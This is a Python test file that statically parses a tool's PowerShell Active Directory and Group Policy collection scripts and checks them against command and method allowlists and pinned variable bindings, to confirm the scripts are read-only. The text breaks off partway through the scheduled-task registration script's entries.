"""Collector read-only enforcement by a PowerShell AST gate in two layers.

The collection scripts run on a domain controller or RSAT host with a domain
account. gpo-lens claims they are read-only against Active Directory, Group
Policy and SYSVOL. This test turns that claim from "by inspection" into a
mechanical check that **parses** (never executes) each in-scope script with the
PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``).

1. **Golden syntax tree** (completeness). ``tests/powershell/collector-inventory.json``
   holds, per script, a canonical order-preserving serialization of the WHOLE
   AST (one line per node: its role in the parent, its type, and every
   semantically relevant property — operators, names, string values, flags,
   ``#Requires``, attributes, every argument) plus a digest of the source text
   (CRLF normalized). ``test_inventory_matches_golden`` fails on ANY difference,
   so every edit — a reorder, a changed argument, a new index assignment or
   ``#Requires`` line, even a comment — must be regenerated and its diff
   reviewed. Meta-tests prove the serializer covers every AST node type and
   property of the running PowerShell and that sampled systematic mutations
   change the tree.

2. **Semantic floor** (``run_all_checks``). ``scripts/gen_collector_inventory.py``
   refuses to regenerate unless every check passes, so a regeneration can only
   admit what these allowlists and pins admit: commands (and a never-allowed
   list), dynamic invocations, static/instance .NET calls, property writes,
   redirections (``$null`` only), ``using`` (none), ``New-Object``/``Add-Type``
   forms, a type-reference denylist, a closed set of AST node types, the exact
   local functions, exact scheduled-task argument vectors, exact pinning of
   every binding of every write/receiver/exec variable and what it reads, no
   provider/global/automatic-variable writes, and the exact text plus
   control-flow context of every write/delete/exec operation. It is a floor,
   not a proof: an admitted change still shows up as a golden diff.

Scope:

* In scope (run on the DC/RSAT host): ``Export-GpoEstate.ps1``,
  ``Export-GroupMembers.ps1``, ``Export-Principals.ps1``,
  ``Run-GpoLensCollection.ps1``, ``GpoLensCollectionMarker.ps1``.
* ``Register-GpoLensCollection.ps1`` also runs on the DC/RSAT host but its job
  is to create a Windows scheduled task (a write to the host, not to AD). Each
  ScheduledTasks cmdlet call must match a pinned argument vector exactly.
* Out of scope: ``install-windows.ps1`` / ``uninstall-windows.ps1`` run on the
  *analysis* host (IIS install), never on a DC.

Residual limits are stated in ``docs/threat-model.md`` R5.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from functools import cache
from pathlib import Path
from typing import Any

import pytest

_REPO = Path(__file__).resolve().parent.parent
_SCRIPTS = _REPO / "scripts"
_DUMPER = _REPO / "tests" / "powershell" / "Get-ScriptCallInventory.ps1"


@dataclass(frozen=True)
class ScriptPolicy:
    commands: frozenset[str]
    static_methods: frozenset[str] = frozenset()
    instance_methods: frozenset[str] = frozenset()
    dynamic_invocations: frozenset[str] = frozenset()
    dot_sources: tuple[str, ...] = ()
    new_object_types: frozenset[str] = frozenset()
    add_type_assemblies: frozenset[str] = frozenset()
    add_type_definitions: frozenset[str] = frozenset()
    member_assignments: frozenset[str] = frozenset()
    write_roots: dict[str, str] = field(default_factory=dict)


# Console output and pure pipeline/data cmdlets; no state outside the process.
_CONSOLE_AND_PIPELINE = frozenset(
    {
        "ConvertFrom-Json",
        "ConvertTo-Json",
        "ForEach-Object",
        "Get-Date",
        "Join-Path",
        "Measure-Object",
        "Out-Null",
        "Out-String",
        "Select-Object",
        "Sort-Object",
        "Where-Object",
        "Write-Error",
        "Write-Host",
        "Write-Progress",
        "Write-Warning",
    }
)
# Local file-system reads.
_FS_READ = frozenset({"Get-ChildItem", "Get-Content", "Get-Item", "Resolve-Path", "Test-Path"})


def _cmds(*names: str, shared: frozenset[str]) -> frozenset[str]:
    """Script-specific commands plus the subset of *shared* the script uses.

    Every name must still be used (the exact-match check), so taking a subset
    of a shared group never widens what a script may call.
    """
    return frozenset(names) | shared


POLICIES: dict[str, ScriptPolicy] = {
    "Export-GpoEstate.ps1": ScriptPolicy(
        commands=_cmds(
            # AD / Group Policy reads.
            "Get-ADDomain",
            "Get-ADGroupMember",
            "Get-ADObject",
            "Get-ADOrganizationalUnit",
            "Get-ADRootDSE",
            "Get-GPInheritance",
            "Get-GPO",
            "Get-GPOReport",
            "Get-Module",
            # Assembly load for ZIP creation; New-Object for SID parsing.
            "Add-Type",
            "New-Object",
            # Local writes, constrained by write_roots.
            "Copy-Item",
            "New-Item",
            "Remove-Item",
            "Set-Content",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertFrom-Json", "Out-String"})
            | (_FS_READ - {"Resolve-Path"}),
        ),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[string]::new",
                "Collections.Generic.List[object]::new",
                "Collections.Generic.List[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFileExtensions::CreateEntryFromFile",
                "IO.File::WriteAllText",
                "math::Round",
                "regex::Matches",
            }
        ),
        instance_methods=frozenset(
            # Collections, strings, ZIP dispose, SecurityIdentifier.Translate
            # (SID -> account name lookup, a read).
            {"Add", "Contains", "Dispose", "Replace", "Split", "Substring", "Translate", "Trim"}
        ),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (created if absent)",
            "testFile": "Join-Path $OutputRoot '_writetest_.tmp' (writability probe, removed)",
            "out": "Join-Path $OutputRoot '<domain>-<stamp>' (this run's export folder)",
            "dest": "Join-Path $out 'SYSVOL-Policies' (the SYSVOL copy target)",
            "archive": '"$ExportPath.zip" where New-GpoExportZip receives -ExportPath $out',
        },
    ),
    "Export-GroupMembers.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADGroupMember",
            "Get-Content",
            "Set-Content",
            shared=frozenset(
                {"ConvertFrom-Json", "ConvertTo-Json", "Get-Date", "Where-Object", "Write-Host"}
            ),
        ),
        # Splatting an optional -Credential into the AD read cmdlets.
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default group-members.json)"},
    ),
    "Export-Principals.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADDomain",
            "Get-ADObject",
            "New-Object",
            "Set-Content",
            shared=frozenset(
                {
                    "ConvertTo-Json",
                    "Get-ChildItem",
                    "Get-Content",
                    "Get-Date",
                    "Join-Path",
                    "Sort-Object",
                    "Test-Path",
                    "Where-Object",
                    "Write-Host",
                }
            ),
        ),
        static_methods=frozenset({"Collections.Generic.HashSet[string]::new", "regex::Matches"}),
        # RawSecurityDescriptor -> SDDL text and SID -> account name: reads.
        instance_methods=frozenset({"Add", "GetSecurityDescriptorSddlForm", "Translate"}),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default principals.json)"},
    ),
    "Run-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            "Copy-Item",
            "Move-Item",
            "New-Item",
            "Remove-Item",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertTo-Json", "Measure-Object", "Write-Progress"})
            | (_FS_READ - {"Get-Content"}),
        ),
        dynamic_invocations=frozenset(
            {
                # Runs the registered collector (default Export-GpoEstate.ps1).
                "& $CollectorPath -OutputRoot $OutputRoot *>&1",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[guid]::new",
                "Collections.Generic.Stack[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFile::OpenRead",
                "IO.File::AppendAllText",
                "IO.File::Open",
                "IO.File::ReadAllBytes",
                "IO.File::WriteAllBytes",
                "Text.UTF8Encoding::new",
                "guid::NewGuid",
                "guid::TryParse",
                "math::Max",
                "string::Equals",
                "string::IsNullOrWhiteSpace",
            }
        ),
        instance_methods=frozenset(
            {
                "Add",
                "ContainsKey",
                # ZipArchive.CreateEntry / ZipArchiveEntry.Delete+Open on the
                # ZIP this run just created (inventory overlay).
                "CreateEntry",
                "Delete",
                "Dispose",
                "GetByteCount",
                "GetEntry",
                "GetString",
                "Open",
                "Pop",
                "Push",
                "Substring",
                "ToString",
                "TrimEnd",
                "TrimStart",
                "Write",
            }
        ),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (owner-marker checked before any write)",
            "LogPath": "Join-Path $OutputRoot 'collection.log'",
            "old": "$LogPath or $LogPath.<n> (log rotation)",
            "next": "$LogPath.<n> (log rotation)",
            "newest": "the single new completed ZIP under $OutputRoot",
            "exportDir": "Join-Path $OutputRoot $newest.BaseName",
            "archive": "an expired completed export ZIP under $OutputRoot (retention)",
            "folder": "Join-Path $OutputRoot $archive.BaseName (retention)",
            "CopyTo": "the -CopyTo delivery directory",
            "partial": "<$delivery>.<guid>.partial inside -CopyTo",
            "delivery": "Join-Path $CopyTo $newest.Name",
        },
    ),
    "GpoLensCollectionMarker.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            # Linux-only test path: link count of the already-open marker inode.
            "stat",
            shared=frozenset({"Get-Item", "Join-Path", "Test-Path"}),
        ),
        static_methods=frozenset(
            {
                "GpoLens.MarkerFileInfo::LinkCount",
                "IO.File::Delete",
                "IO.File::Open",
                "IO.MemoryStream::new",
                "uint32::TryParse",
            }
        ),
        instance_methods=frozenset(
            {"CopyTo", "DangerousGetHandle", "Dispose", "ToArray", "ToInt64", "Write"}
        ),
        # GetFileInformationByHandle P/Invoke (read-only link-count query).
        add_type_definitions=frozenset(
            {"8e3d8b0b78dcf2319d6a1e414007e80fdb055c76715b83f81e94ba32d42c5f67"}
        ),
        write_roots={
            "Marker": "the owner marker path passed by callers (opened for read only)",
            "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
        },
    ),
    # Separate, narrow policy: registering the task is a deliberate write to the
    # host's Task Scheduler (not to AD). Nothing else here writes beyond the
    # output root's owner marker and lock file.
    "Register-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "New-ScheduledTask",
            "New-ScheduledTaskAction",
            "New-ScheduledTaskPrincipal",
            "New-ScheduledTaskSettingsSet",
            "New-ScheduledTaskTrigger",
            "Register-ScheduledTask",
            "Unregister-ScheduledTask",
            # Service-account password prompt, handed only to Task Scheduler.
            "Get-Credential",
            "New-Item",
            shared=frozenset(
                {"Get-Item", "Join-Path", "Out-Null", "Resolve-Path", "Test-Path"}
                | {"Write-Host", "Write-Warning"}
            ),
        ),
        dynamic_invocations=frozenset(
            {
                # Invokes the in-file scriptblock literal passed to
                # Set-GpoLensCollectionOwner (its body is scanned here).
                "& $RegisterTask",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "IO.File::Delete",
                "IO.File::Open",
                "IO.Path::GetFullPath",
                "Text.UTF8Encoding::new",
                "datetime::TryParseExact",
                "string::Equals",
                "string::IsNullOrWhiteSpace",
                "timespan::FromDays",
                "timespan::FromHours",
            }
        ),
        instance_methods=frozenset(
            {
                "Dispose",
                "GetBytes",
                "GetNetworkCredential",
                "GetString",
                "ShouldProcess",
                "TrimEnd",
                "TrimStart",
            }
        ),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (normalized with GetFullPath)",
            "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
        },
    ),
}

OUT_OF_SCOPE = {
    "install-windows.ps1": "runs on the analysis host to install the IIS site, not on a DC",
    "uninstall-windows.ps1": "runs on the analysis host to remove the IIS site, not on a DC",
}

# ---------------------------------------------------------------------------
# Dataflow confinement of write roots and other sink-bound variables (BL-1,
# Sol root_rebind/collector_rebind/registry). A name-only "the target mentions
# $OutputRoot" check is defeated by reassigning the variable; so every
# write-root and exec-pinned variable is pinned here to the exact set of
# assignment right-hand sides its documented derivation uses. Any extra or
# changed `=` assignment (a rebind to UNC/SYSVOL/provider/absolute) is not in
# the set and fails. Parameter defaults and foreach conditions are not pinned
# verbatim but must be path-safe (no UNC, provider, or `..`).
# ---------------------------------------------------------------------------


def _norm(text: str | None) -> str:
    return " ".join((text or "").split())


# Variables used as a write TARGET must all be declared write roots (keys here).
# Values are a short description of the derivation.
WRITE_ROOTS: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        "outputroot": "-OutputRoot parameter (default C:\\gpo-export)",
        "testfile": "Join-Path $OutputRoot '_writetest_.tmp'",
        "out": "Join-Path $OutputRoot '<domain>-<stamp>'",
        "dest": "Join-Path $out 'SYSVOL-Policies'",
        "archive": '"$ExportPath.zip" (ExportPath = $out)',
    },
    "Export-GroupMembers.ps1": {"outputpath": "-OutputPath parameter"},
    "Export-Principals.ps1": {"outputpath": "-OutputPath parameter"},
    "Run-GpoLensCollection.ps1": {
        "outputroot": "-OutputRoot parameter",
        "logpath": "Join-Path $OutputRoot 'collection.log' (function param)",
        "old": "$LogPath or $LogPath.<n> (rotation)",
        "next": "$LogPath.<n> (rotation)",
        "newest": "the one new completed ZIP under $OutputRoot",
        "exportdir": "Join-Path $OutputRoot $newest.BaseName",
        "copyto": "-CopyTo delivery directory",
        "partial": "<delivery>.<guid>.partial under $CopyTo",
        "delivery": "Join-Path $CopyTo $newest.Name",
        "archive": "an expired completed export ZIP under $OutputRoot (foreach)",
        "folder": "Join-Path $OutputRoot $archive.BaseName",
    },
    "GpoLensCollectionMarker.ps1": {
        "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
    },
    "Register-GpoLensCollection.ps1": {
        "outputroot": "[IO.Path]::GetFullPath(-OutputRoot)",
        "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
    },
}

# Every variable whose binding matters is pinned to the EXACT set of its
# bindings (see the binding-key legend at _binding_key): write roots, receivers
# of every instance-method call / property write / index write, splatted
# variables, exec and scheduled-task inputs, dot-sourced function parameters
# pinned by their defining script, and transitively every variable those
# bindings read (_required_vars computes the set; check_pinned_bindings
# requires it to be covered here). Both directions are strict: an extra binding
# (a rebind) and a stale entry both fail. The comment on each entry is why the
# variable is required.
PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        # read by a binding of $gpc
        "allgpc": frozenset(
            {
                (
                    "= Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                    '"(objectClass=groupPolicyContainer)" ` -Properties displayName '
                    "-ErrorAction Stop"
                ),
            }
        ),
        # read by a binding of $gpo
        "allgpos": frozenset(
            {
                "= Get-GPO -All",
            }
        ),
        # receiver of .Add()
        "allsids": frozenset(
            {
                (
                    "= "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # read by a binding of $xmlfiles
        "allxmlpath": frozenset(
            {
                "= Join-Path $out 'AllGPOs.xml'",
            }
        ),
        # write root
        "archive": frozenset(
            {
                '= "$ExportPath.zip"',
            }
        ),
        # receiver of .Add()
        "collectionerrors": frozenset(
            {
                "= [System.Collections.Generic.List[object]]::new()",
            }
        ),
        # write root
        "dest": frozenset(
            {
                "= Join-Path $out 'SYSVOL-Policies'",
            }
        ),
        # read by a binding of $f
        "diskfiles": frozenset(
            {
                (
                    "= @(Get-ChildItem -LiteralPath $ExportPath -Recurse -File ` -ErrorAction "
                    "SilentlyContinue -ErrorVariable +zipEnumErr)"
                ),
            }
        ),
        # receiver of .Split()
        "dom": frozenset(
            {
                "= Get-ADDomain",
            }
        ),
        # read by a binding of $sid
        "domainsids": frozenset(
            {
                (
                    "= @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                    "$principals[$_].type -eq 'Unresolved' })"
                ),
            }
        ),
        # read by a binding of $diskfiles
        "exportpath": frozenset(
            {
                "arg $out",
                "param",
            }
        ),
        # receiver of .Replace()
        "f": frozenset(
            {
                "foreach $diskFiles",
                "foreach $xmlFiles",
            }
        ),
        # receiver of .Add()
        "failedsections": frozenset(
            {
                "= [System.Collections.Generic.List[string]]::new()",
            }
        ),
        # receiver of .Trim()
        "gpc": frozenset(
            {
                "foreach $allGpc",
            }
        ),
        # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
        "gpo": frozenset(
            {
                "foreach $allGpos",
            }
        ),
        # index write $groupMembers[$gSid]
        "groupmembers": frozenset(
            {
                "= [ordered]@{}",
                "index $groupMembers[$gSid]",
                "index $groupMembers['s-1-1-0']",
                "index $groupMembers['s-1-5-11']",
            }
        ),
        # read by a binding of $gsid
        "groupsids": frozenset(
            {
                "= @($principals.Keys | Where-Object { $principals[$_].type -eq 'Group' })",
            }
        ),
        # read by a binding of $groupmembers
        "gsid": frozenset(
            {
                "foreach $groupSids",
            }
        ),
        # receiver of .Add()
        "knownids": frozenset(
            {
                (
                    "= "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # write root
        "out": frozenset(
            {
                '= Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                'param "C:\\gpo-export"',
            }
        ),
        # receiver of .Trim()
        "pf": frozenset(
            {
                "foreach $policyFolders",
            }
        ),
        # read by a binding of $allgpc
        "policiesdn": frozenset(
            {
                '= "CN=Policies,CN=System,$($dom.DistinguishedName)"',
            }
        ),
        # read by a binding of $pf
        "policyfolders": frozenset(
            {
                (
                    "= @(Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction "
                    "SilentlyContinue -ErrorVariable +srcErr)"
                ),
            }
        ),
        # index write $principals[$sid]
        "principals": frozenset(
            {
                "= [ordered]@{}",
                "index $principals[$sid]",
            }
        ),
        # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
        "safe": frozenset(
            {
                "= ($gpo.DisplayName -replace '[\\\\/:*?\"<>|\\[\\]]', '_')",
            }
        ),
        # read by a binding of $principals
        "sid": frozenset(
            {
                "foreach $domainSids",
                "foreach ($allSids | Sort-Object)",
            }
        ),
        # receiver of .Translate()
        "sidobj": frozenset(
            {
                "= New-Object System.Security.Principal.SecurityIdentifier($sid)",
            }
        ),
        # read by a binding of $policyfolders
        "src": frozenset(
            {
                '= "\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"',
            }
        ),
        # read by a binding of $out
        "stamp": frozenset(
            {
                '= Get-Date -Format "yyyyMMdd-HHmmss"',
            }
        ),
        # receiver of .Add()
        "successsections": frozenset(
            {
                "= [System.Collections.Generic.List[string]]::new()",
            }
        ),
        # write root
        "testfile": frozenset(
            {
                '= Join-Path $OutputRoot "_writetest_.tmp"',
            }
        ),
        # read by a binding of $f
        "xmlfiles": frozenset(
            {
                "+= Get-Item -LiteralPath $allXmlPath",
                (
                    "= @(Get-ChildItem -LiteralPath (Join-Path $out 'reports') -Filter '*.xml' "
                    "-ErrorAction SilentlyContinue)"
                ),
            }
        ),
        # receiver of .Dispose()
        "zip": frozenset(
            {
                "= [System.IO.Compression.ZipFile]::Open($archive, 'Create')",
            }
        ),
    },
    "Export-GroupMembers.ps1": {
        # property write $adParams.Credential
        "adparams": frozenset(
            {
                "= @{}",
                "member $adParams.Credential",
            }
        ),
        # index write $groupMembers[$sid]
        "groupmembers": frozenset(
            {
                "= [ordered]@{}",
                'index $groupMembers["s-1-1-0"]',
                'index $groupMembers["s-1-5-11"]',
                "index $groupMembers[$sid]",
            }
        ),
        # read by a binding of $grp
        "groups": frozenset(
            {
                (
                    "= $principalsData.principals.PSObject.Properties | Where-Object { "
                    '$_.Value.type -eq "Group" }'
                ),
            }
        ),
        # read by a binding of $sid
        "grp": frozenset(
            {
                "foreach $groups",
            }
        ),
        # write root
        "outputpath": frozenset(
            {
                'param "group-members.json"',
            }
        ),
        # read by a binding of $groups
        "principalsdata": frozenset(
            {
                "= Get-Content $PrincipalsPath -Raw -Encoding UTF8 | ConvertFrom-Json",
            }
        ),
        # read by a binding of $principalsdata
        "principalspath": frozenset(
            {
                'param "principals.json"',
            }
        ),
        # read by a binding of $groupmembers
        "sid": frozenset(
            {
                "= $grp.Name",
            }
        ),
    },
    "Export-Principals.ps1": {
        # property write $adParams.Credential
        "adparams": frozenset(
            {
                "= @{}",
                "member $adParams.Credential",
            }
        ),
        # receiver of .Add()
        "allsids": frozenset(
            {
                (
                    "= "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # read by a binding of $policiesdn
        "dom": frozenset(
            {
                "= $null",
                "= Get-ADDomain @adParams",
            }
        ),
        # read by a binding of $sid
        "domainsids": frozenset(
            {
                (
                    "= @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                    "$principals[$_].type -eq 'Unresolved' })"
                ),
            }
        ),
        # read by a binding of $sd
        "gpc": frozenset(
            {
                "foreach $gpcObjs",
            }
        ),
        # read by a binding of $gpc
        "gpcobjs": frozenset(
            {
                (
                    "= Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                    '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
                    "displayName @adParams"
                ),
            }
        ),
        # write root
        "outputpath": frozenset(
            {
                'param "principals.json"',
            }
        ),
        # read by a binding of $gpcobjs
        "policiesdn": frozenset(
            {
                '= "CN=Policies,CN=System,$($dom.DistinguishedName)"',
            }
        ),
        # index write $principals[$sid]
        "principals": frozenset(
            {
                "= [ordered]@{}",
                "index $principals[$sid]",
            }
        ),
        # receiver of .GetSecurityDescriptorSddlForm()
        "sd": frozenset(
            {
                "= $gpc.nTSecurityDescriptor",
            }
        ),
        # read by a binding of $principals
        "sid": frozenset(
            {
                "foreach $allSids | Sort-Object",
                "foreach $domainSids",
            }
        ),
        # receiver of .Translate()
        "sidobj": frozenset(
            {
                "= New-Object System.Security.Principal.SecurityIdentifier($sid)",
            }
        ),
    },
    "Run-GpoLensCollection.ps1": {
        # write root
        "archive": frozenset(
            {
                "foreach $candidates",
                "foreach $expired",
            }
        ),
        # parameter of Write-GpoLensOwnerMarkerBytes (pinned in GpoLensCollectionMarker.ps1)
        "bytes": frozenset(
            {
                "= $encoding.GetByteCount($line)",
                "= Read-GpoLensOwnerMarkerBytes -Marker $marker",
            }
        ),
        # read by a binding of $archive
        "candidates": frozenset(
            {
                (
                    "= @(Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' "
                    "-ErrorAction Stop | Where-Object { $_.BaseName -match "
                    "'^.+-\\d{8}-\\d{6}$' -and (Test-Path -LiteralPath (Join-Path (Join-Path "
                    "$OutputRoot $_.BaseName) 'AllGPOs.xml') -PathType Leaf) } | Sort-Object "
                    "@{ Expression = { $_.BaseName.Substring($_.BaseName.Length - 15) }; "
                    "Descending = $true }, Name)"
                ),
            }
        ),
        # dynamic invocation & $CollectorPath -OutputRoot $OutputRoot *>&1
        "collectorpath": frozenset(
            {
                "arg $CollectorPath",
                "param",
                "param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
            }
        ),
        # write root
        "copyto": frozenset(
            {
                "arg $CopyTo",
                "param",
            }
        ),
        # read by a binding of $newest
        "created": frozenset(
            {
                (
                    "= @(Get-GpoLensCompletedExports -OutputRoot $OutputRoot | Where-Object { "
                    "-not $previous.ContainsKey($_.FullName) })"
                ),
            }
        ),
        # write root
        "delivery": frozenset(
            {
                "= Join-Path $CopyTo $newest.Name",
            }
        ),
        # receiver of .GetByteCount()
        "encoding": frozenset(
            {
                "= [Text.UTF8Encoding]::new($false)",
            }
        ),
        # receiver of .Delete()
        "entry": frozenset(
            {
                "= $zip.CreateEntry('gpo-inventory.json')",
                "= $zip.GetEntry('gpo-inventory.json')",
                "foreach @($inventory)",
            }
        ),
        # read by a binding of $archive
        "expired": frozenset(
            {
                (
                    "= @(Get-GpoLensCompletedExports -OutputRoot $OutputRoot | Where-Object { "
                    "[string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - 16), "
                    "$producerPrefix, [StringComparison]::Ordinal) } | Select-Object -Skip "
                    "$Retention)"
                ),
            }
        ),
        # write root
        "exportdir": frozenset(
            {
                "= Join-Path $OutputRoot $newest.BaseName",
            }
        ),
        # read by a binding of $message
        "failure": frozenset(
            {
                "= $_",
            }
        ),
        # write root
        "folder": frozenset(
            {
                "= Join-Path $OutputRoot $archive.BaseName",
            }
        ),
        # read by a binding of $next
        "i": frozenset(
            {
                "= $LogFiles",
                "incdec PostfixMinusMinus",
            }
        ),
        # receiver of .Add()
        "ids": frozenset(
            {
                "= [Collections.Generic.HashSet[guid]]::new()",
            }
        ),
        # read by a binding of $entry
        "inventory": frozenset(
            {
                (
                    "= "
                    "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF) "
                    "| ConvertFrom-Json"
                ),
            }
        ),
        # read by a binding of $inventory
        "inventorybytes": frozenset(
            {
                (
                    "= [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath "
                    "$InventoryPath).ProviderPath)"
                ),
            }
        ),
        # read by a binding of $inventorybytes
        "inventorypath": frozenset(
            {
                "arg $InventoryPath",
                "param",
            }
        ),
        # receiver of .Substring()
        "line": frozenset(
            {
                '= "$(Get-Date -Format o) $Message`r`n"',
                '= $line.Substring(0, $maxChars) + " [truncated]`r`n"',
            }
        ),
        # receiver of .Dispose()
        "lock": frozenset(
            {
                (
                    "= [IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                    "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, "
                    "[IO.FileShare]::None)"
                ),
            }
        ),
        # splatted
        "logargs": frozenset(
            {
                (
                    "= @{LogPath=(Join-Path $OutputRoot 'collection.log'); "
                    "LogMaxBytes=$LogMaxBytes; LogFiles=$LogFiles}"
                ),
            }
        ),
        # read by a binding of $logargs
        "logfiles": frozenset(
            {
                "arg $LogFiles",
                "param",
                "param 5",
                "splat @logArgs",
            }
        ),
        # read by a binding of $logargs
        "logmaxbytes": frozenset(
            {
                "arg $LogMaxBytes",
                "param",
                "param 5242880",
                "splat @logArgs",
            }
        ),
        # write root
        "logpath": frozenset(
            {
                "param",
                "splat @logArgs",
            }
        ),
        # parameter of Read-GpoLensOwnerMarkerBytes (pinned in GpoLensCollectionMarker.ps1)
        "marker": frozenset(
            {
                "= Join-Path $OutputRoot '.gpo-lens-collection-owner'",
                "arg $marker",
            }
        ),
        # read by a binding of $line
        "maxchars": frozenset(
            {
                "= [math]::Max(1, [int]($LogMaxBytes / 4) - 40)",
            }
        ),
        # read by a binding of $line
        "message": frozenset(
            {
                'arg "Collection failed: $($failure.Exception.Message)"',
                (
                    'arg "Collection succeeded: $($newest.Name); retained at most $Retention '
                    'exports"'
                ),
                'arg "ZIP delivered: $delivery"',
                "arg 'Collection started'",
                "arg ($_ | Out-String).TrimEnd()",
                "param",
            }
        ),
        # write root
        "newest": frozenset(
            {
                "= $created[0]",
            }
        ),
        # write root
        "next": frozenset(
            {
                '= "$LogPath.$i"',
            }
        ),
        # write root
        "old": frozenset(
            {
                '= if ($i -eq 1) { $LogPath } else { "$LogPath.$($i - 1)" }',
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                "arg $OutputRoot",
                "param",
            }
        ),
        # write root
        "partial": frozenset(
            {
                "= \"$delivery.$([guid]::NewGuid().ToString('N')).partial\"",
            }
        ),
        # receiver of .Push()
        "pending": frozenset(
            {
                "= [Collections.Generic.Stack[string]]::new()",
            }
        ),
        # receiver of .ContainsKey()
        "previous": frozenset(
            {
                "= @{}",
                "index $previous[$_.FullName]",
            }
        ),
        # read by a binding of $expired
        "producerprefix": frozenset(
            {
                "= $newest.BaseName.Substring(0, $newest.BaseName.Length - 16)",
            }
        ),
        # read by a binding of $message
        "retention": frozenset(
            {
                "arg $Retention",
                "param 14",
            }
        ),
        # receiver of .Write()
        "stream": frozenset(
            {
                "= $entry.Open()",
            }
        ),
        # receiver of .GetEntry()
        "zip": frozenset(
            {
                "= $null",
                "= [IO.Compression.ZipFile]::Open($newest.FullName, 'Update')",
                "= [IO.Compression.ZipFile]::OpenRead($archive.FullName)",
            }
        ),
    },
    "GpoLensCollectionMarker.ps1": {
        # receiver of .ToArray()
        "bytes": frozenset(
            {
                "= [IO.MemoryStream]::new()",
                "param",
            }
        ),
        # write root
        "marker": frozenset(
            {
                "= Join-Path $root.FullName '.gpo-lens-collection-owner'",
                "param",
            }
        ),
        # read by a binding of $root
        "outputroot": frozenset(
            {
                "param",
            }
        ),
        # read by a binding of $marker
        "root": frozenset(
            {
                "= Get-Item -LiteralPath $OutputRoot -Force -ErrorAction Stop",
            }
        ),
        # receiver of .ToInt64()
        "stream": frozenset(
            {
                (
                    "= [IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
                    "[IO.FileShare]::Read)"
                ),
                (
                    "= [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
                    "[IO.FileAccess]::Write, [IO.FileShare]::None)"
                ),
            }
        ),
    },
    "Register-GpoLensCollection.ps1": {
        # New-ScheduledTaskPrincipal argument
        "account": frozenset(
            {
                "= if ($GmsaAccount) { $GmsaAccount } else { $ServiceAccount }",
            }
        ),
        # New-ScheduledTask argument
        "action": frozenset(
            {
                (
                    "= New-ScheduledTaskAction -Execute "
                    '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` '
                    "-Argument $taskArgs -WorkingDirectory $PSScriptRoot"
                ),
            }
        ),
        # read by a binding of $scheduletime
        "at": frozenset(
            {
                "param '02:00'",
            }
        ),
        # parameter of Write-GpoLensOwnerMarkerBytes (pinned in GpoLensCollectionMarker.ps1)
        "bytes": frozenset(
            {
                "arg $previousBytes",
                "arg ([Text.UTF8Encoding]::new($false).GetBytes($TaskName))",
            }
        ),
        # read by a binding of $taskargs
        "collectorpath": frozenset(
            {
